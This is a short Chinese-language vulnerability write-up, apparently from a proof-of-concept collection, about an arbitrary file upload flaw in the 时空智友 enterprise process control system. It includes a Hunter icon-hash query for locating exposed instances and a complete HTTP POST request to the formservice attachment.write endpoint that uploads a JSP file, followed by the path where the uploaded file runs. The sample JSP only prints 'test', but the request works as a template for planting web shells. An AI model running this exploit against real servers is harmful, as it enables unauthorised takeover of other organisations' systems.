# 时空智友企业流程化管控系统formserver任意文件上传漏洞

# 一、漏洞简介
时空智友企业流程化管控系统是一个用于企业流程管理和控制的软件系统。它旨在帮助企业实现流程的规范化、自动化和优化，从而提高工作效率、降低成本并提升管理水平。时空智友企业流程化管控系统存在任意文件上传漏洞，攻击者可通过系统或应用程序的漏洞将恶意文件上传到目标服务器上，导致目标服务器被攻击者控制。

# 二、影响版本
+ 时空智友企业流程化管控系统

# 三、资产测绘
+ hunter`web.icon=="2464cbce5dd2681dd4fb62d055520d78"`
+ 登录页面

![1693803612908-2a0fea76-532f-4ba1-87fa-4fc6bfae5cf3.png](./img/KodiOhi15Unj7TlJ/1693803612908-2a0fea76-532f-4ba1-87fa-4fc6bfae5cf3-152070.png)

# 四、漏洞复现
```plain
POST /formservice?service=attachment.write&isattach=false&filename=a.jsp HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=BDC88B10942C62F82DA953E7503830B2; __qypid=""
Upgrade-Insecure-Requests: 1
Content-Length: 229

<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>JSP 输出 test 字符</title>
</head>
<body>
    <%-- 使用 out 对象输出 test 字符 --%>
    <%= "test" %>
</body>
</html>
```

![1693803668053-3bfeca2b-5e8d-4121-b209-644837708b2f.png](./img/KodiOhi15Unj7TlJ/1693803668053-3bfeca2b-5e8d-4121-b209-644837708b2f-555411.png)

上传文件位置

```plain
http://xx.xx.xx.xx/form/temp/202309043gwzr2x62hiiydrw_a.jsp
```

![1693803717058-b5c7886e-61db-4860-bf7b-3a07ddcdc5c4.png](./img/KodiOhi15Unj7TlJ/1693803717058-b5c7886e-61db-4860-bf7b-3a07ddcdc5c4-718010.png)



> 更新: 2024-02-29 23:55:50  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/wupuwnqwagzlmk58>